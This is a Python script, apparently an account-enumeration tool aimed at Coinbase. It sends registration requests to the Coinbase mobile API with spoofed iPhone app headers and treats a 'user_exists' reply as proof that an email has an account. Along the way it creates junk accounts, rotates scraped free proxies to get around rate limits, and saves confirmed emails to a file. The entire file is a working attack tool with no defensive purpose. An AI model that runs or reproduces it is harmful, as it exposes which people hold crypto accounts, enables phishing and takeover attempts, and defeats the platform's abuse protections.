import logging
import urllib.request
import uuid
import requests
import socket
import queue
import threading
import random
import re

#logging.basicConfig(level=logging.INFO, format="%(message)s")

stop = False
lock = threading.Lock()
output = "valid_coinbase.txt"
wait_thread = False
valid_email = set()
rate_limit = set()

def sslproxies():
    r = requests.get("https://sslproxies.org")
    return re.findall(r"(?:\d+\.?){4}:\d+", r.text)


def free_proxy_list():
    r = requests.get("https://free-proxy-list.net/")
    return re.findall(r"(?:\d+\.?){4}:\d+", r.text)


def us_proxy():
    r = requests.get("https://us-proxy.org/")
    return re.findall(r"(?:\d+\.?){4}:\d+", r.text)

"""
def is_bad_proxy(pip):
    try:
        proxy_handler = urllib.request.ProxyHandler({'http': pip})
        opener = urllib.request.build_opener(proxy_handler)
        opener.addheaders = [('User-agent', 'Mozilla/5.0')]
        urllib.request.install_opener(opener)
        sock=urllib.request.urlopen('http://www.google.com')
        return True
    except urllib.error.HTTPError as e:
        return False
    except Exception as detail:
        return True
    return False
"""

def scrapeProxies():
    print(
        "[ \x1b[93mWAIT\x1b[0m ] \x1b[93m%s is refilling proxy\x1b[0m" % threading.currentThread().name)
    for e in (sslproxies, free_proxy_list, us_proxy):
        prox = e()
        print(
            "[ \x1b[92mOK\x1b[0m ] \x1b[92madded %s new proxies from %s\x1b[0m" % (len(prox), e.__name__))
        yield from prox
"""

proxies = []
def update_proxy():
    while not stop:
        for proxy in scrapeProxies():
            if stop:
                break

            while not len(proxies) < 50:
                continue

            try:
                proxy_handler = urllib.request.ProxyHandler(
                   {
                        "https": "https://{}".format(proxy),
                        "http": "http://{}".format(proxy),
                    })
                opener = urllib.request.build_opener(proxy_handler)
                opener.addheaders = [('User-agent', 'Mozilla/5.0')]
                urllib.request.install_opener(opener)
                urllib.request.urlopen('http://icanhazip.com/')

                print (
                    "[ \x1b[93mADD\x1b[0m ] added proxy: \x1b[93m%s\x1b[0m", proxy)
                with open("p", "a") as fp:
                    fp.write(proxy + "\n")

            except Exception as e:
                print (proxy, e)

exit(update_proxy())
"""

def worker():
    global wait_thread


    while not stop:
        while wait_thread:
            continue

        email = q.get()
        try:
            ip = None
            proxy = None

            if proxies is not None:
                if len(proxies) > 0:
                    ip = random.choice(proxies)
                    proxy = {
                        "https": "https://{}".format(ip),
                        "http": "http://{}".format(ip),
                    }
                else:
                    if inp == "2":
                        # kunci thread

                        lock.acquire()
                        # kasih tau semua thread buat berhenti sebentar
                        if not wait_thread:
                            wait_thread = True
                            # isi ulang proxy
                            proxies.extend(scrapeProxies())

                            # kasih tau lagi semua thread buat lanjut
                            wait_thread = False
                        lock.release()

                        # tambah lagi email saat ini ke queue
                        q.put(email)
                        q.task_done()

                        continue
            r = requests.post("https://api.coinbase.com/v2/mobile/users/",
                              data="accept_user_agreement=true&application_client_id=6011662b0badfa97f9fed5a246526277ff2116affa98cfaacacd012a191ba38d&email={}&first_name=Susj&last_name=Nnsns&locale=en-US&password=@".format(
                                  email),
                              headers={
                                  "Host": "api.coinbase.com",
                                  "X-Os-Name": "iOS",
                                  "User-Agent": "Coinbase/7.48.7 (com.vilcsak.bitcoin2; build:12688; iOS 12.4.0) Alamofire/4.9.1",
                                  "X-Device-Model": "iPhone 7",
                                  "X-Device-Manufacturer": "Apple",
                                  "CB-CLIENT": "com.vilcsak.bitcoin2/7.48.7/12688",
                                  "X-IDFA": uuid.uuid4().__str__(),
                                  "CB-VERSION": "2019-04-16",
                                  "X-Os-Version": "12.4",
                                  "X-App-Build-Number": "12688",
                                  "X-App-Version": "7.48.7",
                                  "X-Locale": "en_US",
                                  "Accept": "application/json",
                                  "X-Device-Brand": "Apple",
                                  "Accept-Encoding": "gzip;q=1.0, compress;q=0.5",
                                  "Content-type": "application/x-www-form-urlencoded"
                              }, timeout=5, proxies=proxy
                              ).json()

            error = r.get("errors")

            status, code, reason = ".DIE.", 91, "validation error"
            if not error or error[0]["id"] == "user_exists":
                lock.acquire()
                valid_email.add(email)
                lock.release()

                status, code, reason = "VALID", 92, "user already exists" if error else "new user registered"
            if error:
                reason = error[0]["id"]

            if reason == "rate_limit_exceeded":
                lock.acquire()
                if ip in proxies:
                    print ("[ \x1b[93mINFO.\x1b[0m ] deleting proxy %s (total proxies %s)" % (ip, len(proxies)))
                    proxies.pop(proxies.index(ip))
                q.put(email)
                rate_limit.add(email)
                lock.release()

            print("[ \x1b[{0}m{1}\x1b[0m ] \x1b[{0}m{3}\x1b[0m: {2} (proxy {4})".format(
                code, status, email, reason, ip))

        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError, ValueError) as e:
            print("[ \x1b[91m.DIE.\x1b[0m ] \x1b[91m{0}\x1b[0m: {1} (proxy {2})".format(
                "invalid proxy", email, ip))
            lock.acquire()
            if ip in proxies:
                print ("[ \x1b[93mINFO.\x1b[0m ] deleting proxy \x1b[93m%s\x1b[0m (total proxies %s)" % (ip, len(proxies)))
                proxies.pop(proxies.index(ip))
            q.put(email)
            lock.release()
        except Exception as e:
            print("[ \x1b[91m.DIE.\x1b[0m ] \x1b[91m{0}\x1b[0m: {1} (proxy {2})".format(
                e.response if isinstance(e, requests.exceptions.RequestException) else e, email, ip))
        q.task_done()


emlist = input("email list: ")
thread = int(input("thread: "))

prx = input("""
1. with proxy
2. without proxy
choice: """)

if prx not in ["1", "2"]:
    exit("choose the right one")


if prx == "1":
    proxies = []

    inp = input("""
1. from list file
2. scrape from website
choice: """)

    if inp not in ["1", "2"]:
        exit("choose the right one")

    if inp == "1":
        prl = input("proxy list: ")
        for i in open(prl).read().splitlines():
            r = re.findall(r"(?:[^:]+:[^@]+@)?(?:\d+\.?){4}:\d+", i)
            if r:
                proxies.append(r[0])
    else:
        proxies.extend(scrapeProxies())
else:
    proxies = None


q = queue.Queue()

threads = []
try:
    for i in range(thread):
        th = threading.Thread(target=worker)
        th.setDaemon(True)
        th.start()

        threads.append(th)

    with open(emlist) as fp:
        for i in fp.readlines():
            while q.qsize() > thread:
                continue
            q.put(i.strip())

    q.join()

    """
    retries = 1000
    while True:
        q.join()

        if temp.empty() or retries < 1:
            break
        else:
            print(
                "[ \x1b[93mWAIT\x1b[0m ] \x1b[93mrefill queue with temporary email (retry %s)\x1b[0m" % retries)

            lock.acquire()
            wait_thread = True
            while not temp.empty():
                q.put(temp.get())
                temp.task_done()
            wait_thread = False
            lock.release()
            retries -= 1
    """
except:
    pass

stop = True
try:
    for th in threads:
        if th.is_alive() and not q.empty():
            print(
                "[ \x1b[93mWAIT\x1b[0m ] \x1b[93mwaiting for %s to finish\x1b[0m" % th.name)
            th.join()
except:
    pass

print("[ \x1b[92mSAVE\x1b[0m ] save %s valid coinbase emails to %s" %
      (len(valid_email), output))
if len(valid_email) > 0:
    with open(output, "a") as fp:
        fp.writelines("\n".join(valid_email) + "\n")

outputrate = "ratelimit_coinbase.txt"
print("[ \x1b[92mSAVE\x1b[0m ] save %s rate_limit coinbase emails to %s" %
      (len(rate_limit), outputrate))
if len(rate_limit) > 0:
    with open(outputrate, "a") as fp:
        fp.writelines("\n".join(rate_limit) + "\n")
